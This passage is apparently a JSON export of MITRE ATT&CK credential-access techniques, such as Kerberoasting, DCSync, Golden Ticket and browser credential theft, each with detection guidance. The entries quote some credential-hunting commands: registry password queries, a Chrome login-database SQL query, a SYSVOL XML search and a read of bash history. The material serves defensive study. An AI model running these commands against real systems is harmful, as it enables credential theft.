11:56:01","pivot":{"technique_id":496,"platform_id":1,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":518,"name":"T1552.003 - Bash History","sort_id":0,"external_id":"T1552.003","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":18,"description":"<p>Adversaries may search the bash command history on compromised systems for insecurely stored credentials. Bash keeps track of the commands users type on the command-line with the &quot;history&quot; utility. Once a user logs out, the history is flushed to the user\u2019s <code>.bash_history<\/code> file. For each user, this file resides at the same location: <code>~\/.bash_history<\/code>. Typically, this file keeps track of the user\u2019s last 500 commands. Users often type usernames and passwords on the command-line as parameters to programs, which then get saved to this file when they log out. Attackers can abuse this by looking through the file for potential credentials. (Citation: External to DA, the OS X Way)<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitoring when the user's <code>.bash_history<\/code> is read can help alert to suspicious activity. While users do typically rely on their history of commands, they often access this history through other utilities like \"history\" instead of commands like <code>cat ~\/.bash_history<\/code>.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":518,"platform_id":1,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":518,"platform_id":2,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":526,"name":"T1003.005 - Cached Domain Credentials","sort_id":0,"external_id":"T1003.005","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":18,"description":"<p>Adversaries may attempt to access cached domain credentials used to allow authentication to occur in the event a domain controller is unavailable.(Citation: Microsoft - Cached Creds)<\/p>\n<p>On Windows Vista and newer, the hash format is DCC2 (Domain Cached Credentials version 2) hash, also known as MS-Cache v2 hash.(Citation: PassLib mscache) The number of default cached credentials varies and can be altered per system. This hash does not allow pass-the-hash style attacks, and instead requires <a href=\"https:\/\/attack.mitre.org\/techniques\/T1110\/002\">Password Cracking<\/a> to recover the plaintext password.(Citation: ired mscache)<\/p>\n<p>With SYSTEM access, the tools\/utilities such as <a href=\"https:\/\/attack.mitre.org\/software\/S0002\">Mimikatz<\/a>, <a href=\"https:\/\/attack.mitre.org\/software\/S0075\">Reg<\/a>, and secretsdump.py can be used to extract the cached credentials.<\/p>\n<p>Note: Cached credentials for Windows Vista are derived using PBKDF2.(Citation: PassLib mscache)<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like Mimikatz. PowerShell scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module,(Citation: Powersploit) which may require additional logging features to be configured in the operating system to collect necessary information for analysis.\n\nDetection of compromised [Valid Accounts](https:\/\/attack.mitre.org\/techniques\/T1078) in-use by adversaries may help as well.","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":526,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":535,"name":"T1552.005 - Cloud Instance Metadata API","sort_id":0,"external_id":"T1552.005","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":18,"description":"<p>Adversaries may attempt to access the Cloud Instance Metadata API to collect credentials and other sensitive data.<\/p>\n<p>Most cloud service providers support a Cloud Instance Metadata API which is a service provided to running virtual instances that allows applications to access information about the running virtual instance. Available information generally includes name, security group, and additional metadata including sensitive data such as credentials and UserData scripts that may contain additional secrets. The Instance Metadata API is provided as a convenience to assist in managing applications and is accessible by anyone who can access the instance.(Citation: AWS Instance Metadata API) A cloud metadata API has been used in at least one high profile compromise.(Citation: Krebs Capital One August 2019)<\/p>\n<p>If adversaries have a presence on the running virtual instance, they may query the Instance Metadata API directly to identify credentials that grant access to additional resources. Additionally, attackers may exploit a Server-Side Request Forgery (SSRF) vulnerability in a public facing web proxy that allows the attacker to gain access to the sensitive information via a request to the Instance Metadata API.(Citation: RedLock Instance Metadata API 2018)<\/p>\n<p>The de facto standard across cloud service providers is to host the Instance Metadata API at <code>http[:]\/\/169.254.169.254<\/code>.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor access to the Instance Metadata API and look for anomalous queries.\n\nIt may be possible to detect adversary use of credentials they have obtained. See [Valid Accounts](https:\/\/attack.mitre.org\/techniques\/T1078) for more information.\n\n","platforms":[{"id":6,"name":"Azure","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":535,"platform_id":6,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":7,"name":"GCP","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":535,"platform_id":7,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":8,"name":"AWS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":535,"platform_id":8,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":553,"name":"T1110.004 - Credential Stuffing","sort_id":0,"external_id":"T1110.004","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":18,"description":"<p>Adversaries may use credentials obtained from breach dumps of unrelated accounts to gain access to target accounts through credential overlap. Occasionally, large numbers of username and password pairs are dumped online when a website or service is compromised and the user account credentials accessed. The information may be useful to an adversary attempting to compromise accounts by taking advantage of the tendency for users to use the same passwords across personal and business accounts.<\/p>\n<p>Credential stuffing is a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies.<\/p>\n<p>Typically, management services over commonly used ports are used when stuffing credentials. Commonly targeted services include the following:<\/p>\n<ul>\n<li>SSH (22\/TCP)<\/li>\n<li>Telnet (23\/TCP)<\/li>\n<li>FTP (21\/TCP)<\/li>\n<li>NetBIOS \/ SMB \/ Samba (139\/TCP &amp; 445\/TCP)<\/li>\n<li>LDAP (389\/TCP)<\/li>\n<li>Kerberos (88\/TCP)<\/li>\n<li>RDP \/ Terminal Services (3389\/TCP)<\/li>\n<li>HTTP\/HTTP Management Services (80\/TCP &amp; 443\/TCP)<\/li>\n<li>MSSQL (1433\/TCP)<\/li>\n<li>Oracle (1521\/TCP)<\/li>\n<li>MySQL (3306\/TCP)<\/li>\n<li>VNC (5900\/TCP)<\/li>\n<\/ul>\n<p>In addition to management services, adversaries may &quot;target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,&quot; as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018)<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor authentication logs for system and application login failures of [Valid Accounts](https:\/\/attack.mitre.org\/techniques\/T1078). If authentication failures are high, then there may be a brute force attempt to gain access to a system using legitimate credentials.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":553,"platform_id":1,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":553,"platform_id":2,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":553,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":4,"name":"Office 365","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":553,"platform_id":4,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":5,"name":"Azure AD","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":553,"platform_id":5,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":6,"name":"Azure","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":553,"platform_id":6,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":7,"name":"GCP","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":553,"platform_id":7,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":8,"name":"AWS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":553,"platform_id":8,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":9,"name":"SaaS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":553,"platform_id":9,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":554,"name":"T1552.001 - Credentials In Files","sort_id":0,"external_id":"T1552.001","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":18,"description":"<p>Adversaries may search local file systems and remote file shares for files containing insecurely stored credentials. These can be files created by users to store their own credentials, shared credential stores for a group of individuals, configuration files containing passwords for a system or service, or source code\/binary files containing embedded passwords.<\/p>\n<p>It is possible to extract passwords from backups or saved virtual machines through <a href=\"https:\/\/attack.mitre.org\/techniques\/T1003\">OS Credential Dumping<\/a>. (Citation: CG 2014) Passwords may also be obtained from Group Policy Preferences stored on the Windows Domain Controller. (Citation: SRD GPP)<\/p>\n<p>In cloud environments, authenticated user credentials are often stored in local configuration and credential files. In some cases, these files can be copied and reused on another machine or the contents can be read and then used to authenticate without needing to copy any files. (Citation: Specter Ops - Cloud Credential Storage)<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"While detecting adversaries accessing these files may be difficult without knowing they exist in the first place, it may be possible to detect adversary use of credentials they have obtained. Monitor the command-line arguments of executing processes for suspicious words or regular expressions that may indicate searching for a password (for example: password, pwd, login, secure, or credentials). See [Valid Accounts](https:\/\/attack.mitre.org\/techniques\/T1078) for more information.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":554,"platform_id":1,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":554,"platform_id":2,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":554,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":6,"name":"Azure","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":554,"platform_id":6,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":7,"name":"GCP","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":554,"platform_id":7,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":8,"name":"AWS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":554,"platform_id":8,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":555,"name":"T1555 - Credentials from Password Stores","sort_id":0,"external_id":"T1555","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":18,"description":"<p>Adversaries may search for common password storage locations to obtain user credentials. Passwords are stored in several places on a system, depending on the operating system or application holding the credentials. There are also specific applications that store passwords to make it easier for users manage and maintain. Once credentials are obtained, they can be used to perform lateral movement and access restricted information.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor system calls, file read events, and processes for suspicious activity that could indicate searching for a password  or other activity related to performing keyword searches (e.g. password, pwd, login, store, secure, credentials, etc.) in process memory for credentials. File read events should be monitored surrounding known password storage applications.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":555,"platform_id":1,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":555,"platform_id":2,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":555,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":556,"name":"T1555.003 - Credentials from Web Browsers","sort_id":0,"external_id":"T1555.003","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":18,"description":"<p>Adversaries may acquire credentials from web browsers by reading files specific to the target browser.(Citation: Talos Olympic Destroyer 2018) Web browsers commonly save credentials such as website usernames and passwords so that they do not need to be entered manually in the future. Web browsers typically store the credentials in an encrypted format within a credential store; however, methods exist to extract plaintext credentials from web browsers.<\/p>\n<p>For example, on Windows systems, encrypted credentials may be obtained from Google Chrome by reading a database file, <code>AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data<\/code> and executing a SQL query: <code>SELECT action_url, username_value, password_value FROM logins;<\/code>. The plaintext password can then be obtained by passing the encrypted credentials to the Windows API function <code>CryptUnprotectData<\/code>, which uses the victim\u2019s cached logon credentials as the decryption key. (Citation: Microsoft CryptUnprotectData \u200eApril 2018)<\/p>\n<p>Adversaries have executed similar procedures for common web browsers such as FireFox, Safari, Edge, etc. (Citation: Proofpoint Vega Credential Stealer May 2018)(Citation: FireEye HawkEye Malware July 2017)<\/p>\n<p>Adversaries may also acquire credentials by searching web browser process memory for patterns that commonly match credentials.(Citation: GitHub Mimikittenz July 2016)<\/p>\n<p>After acquiring credentials from web browsers, adversaries may attempt to recycle the credentials across different systems and\/or accounts in order to expand access. This can result in significantly furthering an adversary's objective in cases where credentials gained from web browsers overlap with privileged accounts (e.g. domain administrator).<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Identify web browser files that contain credentials such as Google Chrome\u2019s Login Data database file: <code>AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data<\/code>. Monitor file read events of web browser files that contain credentials, especially when the reading process is unrelated to the subject web browser. Monitor process execution logs to include PowerShell Transcription focusing on those that perform a combination of behaviors including reading web browser process memory, utilizing regular expressions, and those that contain numerous keywords for common web applications (Gmail, Twitter, Office365, etc.).","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":556,"platform_id":1,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":556,"platform_id":2,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":556,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":557,"name":"T1552.002 - Credentials in Registry","sort_id":0,"external_id":"T1552.002","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":18,"description":"<p>Adversaries may search the Registry on compromised systems for insecurely stored credentials. The Windows Registry stores configuration information that can be used by the system or other programs. Adversaries may query the Registry looking for credentials and passwords that have been stored for use by other programs or services. Sometimes these credentials are used for automatic logons.<\/p>\n<p>Example commands to find Registry keys related to password information: (Citation: Pentestlab Stored Credentials)<\/p>\n<ul>\n<li>Local Machine Hive: <code>reg query HKLM \/f password \/t REG_SZ \/s<\/code><\/li>\n<li>Current User Hive: <code>reg query HKCU \/f password \/t REG_SZ \/s<\/code><\/li>\n<\/ul>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor processes for applications that can be used to query the Registry, such as [Reg](https:\/\/attack.mitre.org\/software\/S0075), and collect command parameters that may indicate credentials are being searched. Correlate activity with related suspicious behavior that may indicate an active intrusion to reduce false positives.","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":557,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":559,"name":"T1003.006 - DCSync","sort_id":0,"external_id":"T1003.006","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":18,"description":"<p>Adversaries may attempt to access credentials and other sensitive information by abusing a Windows Domain Controller's application programming interface (API)(Citation: Microsoft DRSR Dec 2017) (Citation: Microsoft GetNCCChanges) (Citation: Samba DRSUAPI) (Citation: Wine API samlib.dll) to simulate the replication process from a remote domain controller using a technique called DCSync.<\/p>\n<p>Members of the Administrators, Domain Admins, and Enterprise Admin groups or computer accounts on the domain controller are able to run DCSync to pull password data(Citation: ADSecurity Mimikatz DCSync) from Active Directory, which may include current and historical hashes of potentially useful accounts such as KRBTGT and Administrators. The hashes can then in turn be used to create a <a href=\"https:\/\/attack.mitre.org\/techniques\/T1558\/001\">Golden Ticket<\/a> for use in <a href=\"https:\/\/attack.mitre.org\/techniques\/T1550\/003\">Pass the Ticket<\/a>(Citation: Harmj0y Mimikatz and DCSync) or change an account's password as noted in <a href=\"https:\/\/attack.mitre.org\/techniques\/T1098\">Account Manipulation<\/a>.(Citation: InsiderThreat ChangeNTLM July 2017)<\/p>\n<p>DCSync functionality has been included in the &quot;lsadump&quot; module in <a href=\"https:\/\/attack.mitre.org\/software\/S0002\">Mimikatz<\/a>.(Citation: GitHub Mimikatz lsadump Module) Lsadump also includes NetSync, which performs DCSync over a legacy replication protocol.(Citation: Microsoft NRPC Dec 2017)<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor domain controller logs for replication requests and other unscheduled activity possibly associated with DCSync.(Citation: Microsoft DRSR Dec 2017) (Citation: Microsoft GetNCCChanges) (Citation: Samba DRSUAPI) Also monitor for network protocols(Citation: Microsoft DRSR Dec 2017) (Citation: Microsoft NRPC Dec 2017) and other replication requests(Citation: Microsoft SAMR) from IPs not associated with known domain controllers.(Citation: AdSecurity DCSync Sept 2015)\n\nNote: Domain controllers may not log replication requests originating from the default domain controller account.(Citation: Harmj0y DCSync Sept 2015)","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":559,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":580,"name":"T1556.001 - Domain Controller Authentication","sort_id":0,"external_id":"T1556.001","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":18,"description":"<p>Adversaries may patch the authentication process on a domain control to bypass the typical authentication mechanisms and enable access to accounts. <\/p>\n<p>Malware may be used to inject false credentials into the authentication process on a domain control with the intent of creating a backdoor used to access any user\u2019s account and\/or credentials (ex: <a href=\"https:\/\/attack.mitre.org\/software\/S0007\">Skeleton Key<\/a>). Skeleton key works through a patch on an enterprise domain controller authentication process (LSASS) with credentials that adversaries may use to bypass the standard authentication system. Once patched, an adversary can use the injected password to successfully authenticate as any domain user account (until the the skeleton key is erased from memory by a reboot of the domain controller). Authenticated access may enable unfettered access to hosts and\/or resources within single-factor authentication environments.(Citation: Dell Skeleton)<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor for calls to <code>OpenProcess<\/code> that can be used to manipulate lsass.exe running on a domain controller as well as for malicious modifications to functions exported from authentication-related system DLLs (such as cryptdll.dll and samsrv.dll).(Citation: Dell Skeleton)\n\nConfigure robust, consistent account activity audit policies across the enterprise and with externally accessible services.(Citation: TechNet Audit Policy) Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g. a user has an active login session but has not entered the building or does not have VPN access). ","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":580,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":613,"name":"T1558.001 - Golden Ticket","sort_id":0,"external_id":"T1558.001","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":18,"description":"<p>Adversaries who have the KRBTGT account password hash may forge Kerberos ticket-granting tickets (TGT), also known as a golden ticket.(Citation: AdSecurity Kerberos GT Aug 2015) Golden tickets enable adversaries to generate authentication material for any account in Active Directory.(Citation: CERT-EU Golden Ticket Protection) <\/p>\n<p>Using a golden ticket, adversaries are then able to request ticket granting service (TGS) tickets, which enable access to specific resources. Golden tickets require adversaries to interact with the Key Distribution Center (KDC) in order to obtain TGS.(Citation: ADSecurity Detecting Forged Tickets)<\/p>\n<p>The KDC service runs all on domain controllers that are part of an Active Directory domain. KRBTGT is the Kerberos Key Distribution Center (KDC) service account and is responsible for encrypting and signing all Kerberos tickets.(Citation: ADSecurity Kerberos and KRBTGT) The KRBTGT password hash may be obtained using <a href=\"https:\/\/attack.mitre.org\/techniques\/T1003\">OS Credential Dumping<\/a> and privileged access to a domain controller.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor for anomalous Kerberos activity, such as malformed or blank fields in Windows logon\/logoff events (Event ID 4624, 4672, 4634), RC4 encryption within TGTs, and TGS requests without preceding TGT requests.(Citation: ADSecurity Kerberos and KRBTGT)(Citation: CERT-EU Golden Ticket Protection)(Citation: Stealthbits Detect PtT 2019)\n\nMonitor the lifetime of TGT tickets for values that differ from the default domain duration.(Citation: Microsoft Kerberos Golden Ticket)\n\nMonitor for indications of [Pass the Ticket](https:\/\/attack.mitre.org\/techniques\/T1550\/003) being used to move laterally. \n","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":613,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":614,"name":"T1552.006 - Group Policy Preferences","sort_id":0,"external_id":"T1552.006","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":18,"description":"<p>Adversaries may attempt to find unsecured credentials in Group Policy Preferences (GPP). GPP are tools that allow administrators to create domain policies with embedded credentials. These policies allow administrators to set local accounts.(Citation: Microsoft GPP 2016)<\/p>\n<p>These group policies are stored in SYSVOL on a domain controller. This means that any domain user can view the SYSVOL share and decrypt the password (using the AES key that has been made public).(Citation: Microsoft GPP Key)<\/p>\n<p>The following tools and scripts can be used to gather and decrypt the password file from Group Policy Preference XML files:<\/p>\n<ul>\n<li>Metasploit\u2019s post exploitation module: <code>post\/windows\/gather\/credentials\/gpp<\/code><\/li>\n<li>Get-GPPPassword(Citation: Obscuresecurity Get-GPPPassword)<\/li>\n<li>gpprefdecrypt.py<\/li>\n<\/ul>\n<p>On the SYSVOL share, adversaries may use the following command to enumerate potential GPP XML files: <code>dir \/s * .xml<\/code><\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor for attempts to access SYSVOL that involve searching for XML files. \n\nDeploy a new XML file with permissions set to Everyone:Deny and monitor for Access Denied errors.(Citation: ADSecurity Finding Passwords in SYSVOL)","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":614,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":634,"name":"T1558.003 - Kerberoasting","sort_id":0,"external_id":"T1558.003","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":18,"description":"<p>Adversaries may abuse a valid Kerberos ticket-granting ticket (TGT) or sniff network traffic to obtain a ticket-granting service (TGS) ticket that may be vulnerable to <a href=\"https:\/\/attack.mitre.org\/techniques\/T1110\">Brute Force<\/a>.(Citation: Empire InvokeKerberoast Oct 2016)(Citation: AdSecurity Cracking Kerberos Dec 2015) <\/p>\n<p>Service principal names (SPNs) are used to uniquely identify each instance of a Windows service. To enable authentication, Kerberos requires that SPNs be associated with at least one service logon account (an account specifically tasked with running a service(Citation: Microsoft Detecting Kerberoasting Feb 2018)).(Citation: Microsoft SPN)(Citation: Microsoft SetSPN)(Citation: SANS Attacking Kerberos Nov 2014)(Citation: Harmj0y Kerberoast Nov 2016)<\/p>\n<p>Adversaries possessing a valid Kerberos ticket-granting ticket (TGT) may request one or more Kerberos ticket-granting service (TGS) service tickets for any SPN from a domain controller (DC).(Citation: Empire InvokeKerberoast Oct 2016)(Citation: AdSecurity Cracking Kerberos Dec 2015) Portions of these tickets may be encrypted with the RC4 algorithm, meaning the Kerberos 5 TGS-REP etype 23 hash of the service account associated with the SPN is used as the private key and is thus vulnerable to offline <a href=\"https:\/\/attack.mitre.org\/techniques\/T1110\">Brute Force<\/a> attacks that may expose plaintext credentials.(Citation: AdSecurity Cracking Kerberos Dec 2015)(Citation: Empire InvokeKerberoast Oct 2016) (Citation: Harmj0y Kerberoast Nov 2016)<\/p>\n<p>This same attack could be executed using service tickets captured from network traffic.(Citation: AdSecurity Cracking Kerberos Dec 2015)<\/p>\n<p>Cracked hashes may enable <a href=\"https:\/\/attack.mitre.org\/tactics\/TA0003\">Persistence<\/a>, <a href=\"https:\/\/attack.mitre.org\/tactics\/TA0004\">Privilege Escalation<\/a>, and <a href=\"https:\/\/attack.mitre.org\/tactics\/TA0008\">Lateral Movement<\/a> via access to <a href=\"https:\/\/attack.mitre.org\/techniques\/T1078\">Valid Accounts<\/a>.(Citation: SANS Attacking Kerberos Nov 2014)<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Enable Audit Kerberos Service Ticket Operations to log Kerberos TGS service ticket requests. Particularly investigate irregular patterns of activity (ex: accounts making numerous requests, Event ID 4769, within a small time frame, especially if they also request RC4 encryption [Type 0x17]).(Citation: Microsoft Detecting Kerberoasting Feb 2018)(Citation: AdSecurity Cracking Kerberos Dec 2015)","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":634,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":636,"name":"T1555.001 - Keychain","sort_id":0,"external_id":"T1555.001","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":18,"description":"<p>Adversaries may collect the keychain storage data from a system to acquire credentials. Keychains are the built-in way for macOS to keep track of users' passwords and credentials for many services and features such as WiFi passwords, websites, secure notes, certificates, and Kerberos. Keychain files are located in <code>~\/Library\/Keychains\/<\/code>,<code>\/Library\/Keychains\/<\/code>, and <code>\/Network\/Library\/Keychains\/<\/code>. (Citation: Wikipedia keychain) The <code>security<\/code> command-line utility, which is built into macOS by default, provides a useful way to manage these 